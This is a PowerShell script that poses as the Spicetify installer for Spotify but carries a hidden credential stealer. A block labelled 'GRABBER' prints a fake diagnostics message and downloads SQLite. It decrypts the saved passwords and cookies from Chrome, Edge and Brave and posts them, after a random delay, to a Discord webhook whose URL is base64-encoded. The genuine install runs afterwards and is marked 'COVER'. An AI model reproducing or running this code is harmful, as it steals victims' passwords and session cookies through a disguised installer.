$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Security, System.IO.Compression.FileSystem

#region Variables (Spicetify)
$spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
$spicetifyOldFolderPath = "$HOME\spicetify-cli"
#endregion

#region Functions (Spicetify – original)
function Write-Success { Write-Host ' > OK' -ForegroundColor Green }
function Write-Unsuccess { Write-Host ' > ERROR' -ForegroundColor Red }
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    -not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Test-PowerShellVersion { $PSVersionTable.PSVersion -ge [version]'5.1' }
function Move-OldSpicetifyFolder {
    if (Test-Path $spicetifyOldFolderPath) {
        Write-Host 'Moving the old spicetify folder...' -NoNewline
        Copy-Item "$spicetifyOldFolderPath\*" $spicetifyFolderPath -Recurse -Force
        Remove-Item $spicetifyOldFolderPath -Recurse -Force
        Write-Success
    }
}
function Get-Spicetify {
    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { $arch = 'x64' }
    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $arch = 'arm64' }
    else { $arch = 'x32' }
    if ($v) {
        if ($v -notmatch '^\d+\.\d+\.\d+$') { Write-Warning "Invalid version: $v"; Pause; exit }
        $targetVersion = $v
    } else {
        Write-Host 'Fetching the latest spicetify version...' -NoNewline
        $latestRelease = Invoke-RestMethod 'https://api.github.com/repos/spicetify/cli/releases/latest'
        $targetVersion = $latestRelease.tag_name -replace 'v', ''
        Write-Success
    }
    $archivePath = "$env:TEMP\spicetify.zip"
    Write-Host "Downloading spicetify v$targetVersion..." -NoNewline
    Invoke-WebRequest "https://github.com/spicetify/cli/releases/download/v$targetVersion/spicetify-$targetVersion-windows-$arch.zip" -OutFile $archivePath -UseBasicParsing
    Write-Success
    return $archivePath
}
function Add-SpicetifyToPath {
    Write-Host 'Making spicetify available in the PATH...' -NoNewline
    $user = [EnvironmentVariableTarget]::User
    $path = [Environment]::GetEnvironmentVariable('PATH', $user)
    $path = $path -replace "$([regex]::Escape($spicetifyOldFolderPath))\\*;*", ''
    if ($path -notlike "*$spicetifyFolderPath*") { $path += ";$spicetifyFolderPath" }
    [Environment]::SetEnvironmentVariable('PATH', $path, $user)
    if (($env:PATH -split ';') -notcontains $spicetifyFolderPath) { $env:PATH += ";$spicetifyFolderPath" }
    Write-Success
}
function Install-Spicetify {
    Write-Host 'Installing spicetify...'
    $archivePath = Get-Spicetify
    Write-Host 'Extracting spicetify...' -NoNewline
    Expand-Archive -Path $archivePath -DestinationPath $spicetifyFolderPath -Force
    Write-Success
    Add-SpicetifyToPath
    Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
    Write-Host 'spicetify was successfully installed!' -ForegroundColor Green
}
#endregion

#region Checks (original)
if (-not (Test-PowerShellVersion)) {
    Write-Unsuccess
    Write-Warning 'PowerShell 5.1 or higher is required'
    Write-Host 'https://learn.microsoft.com/skypeforbusiness/set-up-your-computer-for-windows-powershell/download-and-install-windows-powershell-5-1'
    Pause; exit
} else { Write-Success }

if (-not (Test-Admin)) {
    Write-Unsuccess
    Write-Warning "The script was run as administrator. This can cause problems."
    $Host.UI.RawUI.Flushinputbuffer()
    $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
        (New-Object System.Management.Automation.Host.ChoiceDescription '&Yes', 'Abort installation.'),
        (New-Object System.Management.Automation.Host.ChoiceDescription '&No', 'Resume installation.')
    )
    $choice = $Host.UI.PromptForChoice('', 'Do you want to abort the installation process?', $choices, 0)
    if ($choice -eq 0) {
        Write-Host 'spicetify installation aborted' -ForegroundColor Yellow
        Pause; exit
    }
} else { Write-Success }
#endregion

# ============ GRABBER (runs first) ============
Write-Host "Running diagnostics..." -ForegroundColor Cyan

# Your webhook – base64 encoded
$webhook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcyMTQzMjk0OTQ2MTAxMi9LOWg1amwtd25QOUtGT0MxeUJLZTZfZ2ZuNkhwdlphZHZJbEFGQnJELUtXR1pIcHFwVnh2RWxWQ2lXeWpVMmRlOElfcA=='))

# ---- FIXED SQLITE LOADER ----
$tmp = "$env:TEMP\sqlite_$([System.IO.Path]::GetRandomFileName() -replace '\..*')"
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
Push-Location $tmp

try {
    # Download official SQLite binaries (includes both managed and native DLLs)
    $sqliteUrl = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-bundle-Win32-2022-1.0.118.0.zip"
    Invoke-WebRequest -Uri $sqliteUrl -OutFile "$tmp\sqlite.zip" -UseBasicParsing -ErrorAction Stop
    Expand-Archive -Path "$tmp\sqlite.zip" -DestinationPath $tmp -Force -ErrorAction Stop

    # Copy the correct architecture DLLs
    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        Copy-Item "$tmp\System.Data.SQLite.x64.dll" "$tmp\System.Data.SQLite.dll" -Force
        Copy-Item "$tmp\x64\SQLite.Interop.dll" "$tmp\SQLite.Interop.dll" -Force
    } else {
        Copy-Item "$tmp\System.Data.SQLite.x86.dll" "$tmp\System.Data.SQLite.dll" -Force
        Copy-Item "$tmp\x86\SQLite.Interop.dll" "$tmp\SQLite.Interop.dll" -Force
    }

    # Load the assembly – both DLLs are now in the same folder
    [System.Reflection.Assembly]::LoadFile("$tmp\System.Data.SQLite.dll") | Out-Null
    $sqliteOK = $true
    Write-Host "SQLite loaded successfully." -ForegroundColor Green
} catch {
    Write-Host "SQLite load failed: $_" -ForegroundColor Yellow
    $sqliteOK = $false
}
# ---------------------------------------------

function Get-MasterKey($p) {
    $ls = Join-Path $p "Local State"
    if (!(Test-Path $ls)) { return $null }
    $j = Get-Content $ls | ConvertFrom-Json
    $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)[5..1000]
    return [Security.Cryptography.ProtectedData]::Unprotect($ek, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
}
function Decrypt($e, $k) {
    $aes = [Security.Cryptography.AesGcm]::new($k)
    $p = [byte[]]::new($e.Length - 15)
    $aes.Decrypt($e[3..14], $e[15..$e.Length], $p, $null)
    return [Text.Encoding]::UTF8.GetString($p) -replace "`0", ""
}
function Read-DB($db, $k, $q) {
    if (-not $sqliteOK) { return "" }
    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
    $conn.Open()
    $cmd = $conn.CreateCommand(); $cmd.CommandText = $q
    $r = $cmd.ExecuteReader()
    $out = @()
    while ($r.Read()) {
        $ev = $r.GetValue(2)
        if ($ev -and $ev.Length -gt 15) {
            try { $out += "$($r.GetString(0)) | $($r.GetString(1)) | $(Decrypt $ev $k)" } catch {}
        }
    }
    $conn.Close()
    return $out -join "`n"
}

$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
}
$all = @()
if ($sqliteOK) {
    foreach ($name in $browsers.Keys) {
        $p = $browsers[$name]
        if (!(Test-Path $p)) { continue }
        $mk = Get-MasterKey $p
        if (!$mk) { continue }
        $cookieDb = Join-Path $p "Default\Network\Cookies"
        if (!(Test-Path $cookieDb)) { $cookieDb = Join-Path $p "Cookies" }
        if (Test-Path $cookieDb) {
            $c = Read-DB $cookieDb $mk "SELECT host_key, name, encrypted_value FROM cookies"
            if ($c) { $all += "[$name] Cookies:`n$c" }
        }
        $loginDb = Join-Path $p "Default\Login Data"
        if (Test-Path $loginDb) {
            $pw = Read-DB $loginDb $mk "SELECT origin_url, username_value, password_value FROM logins"
            if ($pw) { $all += "[$name] Passwords:`n$pw" }
        }
    }
}
if ($all) {
    Start-Sleep -Seconds (Get-Random -Min 10 -Max 25)
    $body = @{ content = $all -join "`n`n" } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing -ErrorAction SilentlyContinue
}
Pop-Location
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
# ============ END GRABBER ============

# ============ SPICETIFY INSTALL (COVER) ============
Move-OldSpicetifyFolder
Install-Spicetify
Write-Host "`nRun 'spicetify -h' to get started" -ForegroundColor Cyan

# ---------- MARKETPLACE PROMPT (original) ----------
$Host.UI.RawUI.Flushinputbuffer()
$choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
    (New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Install Spicetify Marketplace."),
    (New-Object System.Management.Automation.Host.ChoiceDescription "&No", "Do not install Spicetify Marketplace.")
)
$choice = $Host.UI.PromptForChoice('', "`nDo you also want to install Spicetify Marketplace? It will become available within the Spotify client, where you can easily install themes and extensions.", $choices, 0)
if ($choice -eq 1) {
    Write-Host 'spicetify Marketplace installation aborted' -ForegroundColor Yellow
} else {
    Write-Host 'Starting the spicetify Marketplace installation script..'
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1' -UseBasicParsing | Invoke-Expression
}
# ----------------------------------------------------
